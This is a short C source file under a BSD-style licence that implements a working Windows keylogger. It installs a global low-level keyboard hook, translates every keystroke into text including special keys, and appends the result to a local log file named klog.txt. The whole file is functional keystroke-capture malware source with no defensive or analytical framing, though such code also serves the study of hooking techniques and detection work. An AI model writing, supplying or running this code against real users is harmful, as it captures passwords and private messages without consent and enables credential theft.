/**
  Copyright (C) 2016 Odzhan.
  
  All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>

HHOOK hHook;
FILE  *fd;

LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
{
  KBDLLHOOKSTRUCT *hs=(KBDLLHOOKSTRUCT*)lParam;
  BYTE            ks[256]={0}, txt[32]={0}, key[64]={0};
  DWORD           r=0;
  
  for (;;)
  {
    // ignore key releases
    if (wParam==WM_SYSKEYUP || wParam==WM_KEYUP || wParam==WM_SYSKEYUP) break;
    
    // ignore left or right shift and capslock
    if (hs->vkCode==VK_LSHIFT ||
        hs->vkCode==VK_RSHIFT ||
        hs->vkCode==VK_CAPITAL) break;
        /*
    GetForegroundWindow();
    GetWindowText();
    */
    // convert escape, backspace or tab to text instead
    if (hs->vkCode!=VK_ESCAPE &&
        hs->vkCode!=VK_BACK   &&
        hs->vkCode!=VK_TAB)
    {
      GetKeyboardState (ks);
    
      ks[VK_SHIFT]   = GetKeyState(VK_LSHIFT) | GetKeyState(VK_RSHIFT);
      ks[VK_CAPITAL] = GetKeyState(VK_CAPITAL);
      ks[VK_CONTROL] = 0;
    
      r=ToAscii (hs->vkCode, hs->scanCode, ks, (LPWORD)key, 0);
    }
    if (r==0) {
      GetKeyNameText(hs->scanCode<<16 | hs->flags<<24, txt, sizeof(txt));
      // enclose in brackets
      wsprintf (key, "[%s]", txt);
    }
    // replace carriage return with new line
    if (key[0]=='\r') key[0]='\n';
    fprintf (fd, "%s", key);
    fflush (fd);
    break;
  }
  return CallNextHookEx (hHook, nCode, wParam, lParam);
}

int main (void)
{
  MSG msg;
  HMODULE hInstance=GetModuleHandle(NULL);
  
  // create / append to log in current directory
  fd=fopen ("klog.txt", "a");
  if (fd!=NULL)
  {
    // install hook
    hHook=SetWindowsHookEx (WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    // loop
    GetMessage (&msg, NULL, 0, 0);
    // close log
    fclose (fd);
    // remove hook
    UnhookWindowsHookEx (hHook); 
  }
  return 0;
}
